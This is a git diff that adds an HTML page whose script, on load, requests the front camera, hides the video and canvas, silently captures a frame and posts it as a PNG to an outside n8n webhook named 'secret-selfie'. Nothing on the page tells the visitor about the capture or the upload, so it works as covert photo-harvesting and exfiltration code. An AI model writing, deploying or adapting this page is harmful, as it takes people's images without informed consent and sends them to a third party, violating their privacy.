@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+<body>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <img id="photo" />
+
+    <script>
+        (async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: false
+                });
+
+                const video = document.getElementById("video");
+                const canvas = document.getElementById("canvas");
+                const photo = document.getElementById("photo");
+
+                video.srcObject = stream;
+
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+
+                    canvas
+                        .getContext("2d")
+                        .drawImage(video, 0, 0);
+
+                    const imageData = canvas.toDataURL("image/png");
+                    photo.src = imageData;
+
+                    // SEND TO n8n
+                    fetch("https://chloroformshake.app.n8n.cloud/webhook/secret-selfie", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            image: imageData
+                        })
+                    });
+
+                    stream.getTracks().forEach(t => t.stop());
+
+                }, 800);
+
+            } catch (err) {
+                console.log("Permission denied or blocked:", err);
+            }
+        })();
+    </script>
+
+</body>
+
+</html>
